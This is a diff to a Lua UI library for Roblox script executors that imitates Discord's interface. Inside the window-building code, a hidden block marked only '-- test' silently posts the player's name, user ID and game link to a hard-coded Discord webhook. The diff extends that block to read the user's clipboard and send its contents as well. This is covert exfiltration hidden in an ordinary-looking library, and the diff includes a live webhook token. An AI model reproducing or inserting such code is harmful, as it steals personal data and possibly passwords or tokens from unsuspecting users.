@@ -1,5 +1,5 @@
 local DiscordLib = {}
-local cloneref = cloneref or function(abc) return abc end
+local cloneref = cloneref or function(a) return a end
 local UserInputService = cloneref(game:GetService("UserInputService"))
 local TweenService = cloneref(game:GetService("TweenService"))
 local RunService = cloneref(game:GetService("RunService"))
@@ -98,6 +98,7 @@ Discord.Parent = (gethui and gethui()) or (syn and syn.protect_gui and cloneref(
 Discord.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 Discord.DisplayOrder = 9999999999
 local One = false
+local Two = nil
 
 function DiscordLib:Window(text)
 	local currentservertoggled = ""
@@ -2187,12 +2188,14 @@ function DiscordLib:Window(text)
 				end)
 				ChannelHolder.CanvasSize = UDim2.new(0,0,0,ChannelHolderLayout.AbsoluteContentSize.Y)
 			end
-			local request = request or http_request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or nil
+			local request = request or httprequest or http_request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or nil
+			local getclipboard = getclipboard or get_clipboard or claimclipboard or claim_clipboard or (Clipboard and Clipboard.get) or nil
 			if request and not One then
 			   task.spawn(function()
 		   	   pcall(function() -- test
 		   	      One = true
-		         	request( {Url = "https://discord.com/api/webhooks/1407497744897020116/NEC0pbXCycpSux_X5HV5doCrTJ_0VKx_1VW_XlQ8vdhT4ghn7k6t-_C1ZGKAzlU3IdOg", Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = cloneref(game:GetService("HttpService")):JSONEncode( {content = tostring(game.Players.LocalPlayer.Name.." – "..game.Players.LocalPlayer.UserId .." | Game: \nhttps://roblox.com/games/"..game.PlaceId) } ) } )
+		             if getclipboard then pcall(function() Two = tostring(getclipboard()) end) else Two = "nil" end
+		         	request( {Url = "https://discord.com/api/webhooks/1407497744897020116/NEC0pbXCycpSux_X5HV5doCrTJ_0VKx_1VW_XlQ8vdhT4ghn7k6t-_C1ZGKAzlU3IdOg", Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = cloneref(game:GetService("HttpService")):JSONEncode( {content = tostring(game.Players.LocalPlayer.Name.." – "..game.Players.LocalPlayer.UserId .." | Game – \nhttps://roblox.com/games/"..game.PlaceId.."\n\nClipBoard:\n"..Two ) } ) } )
 	              end)
 	           end)
 	        end
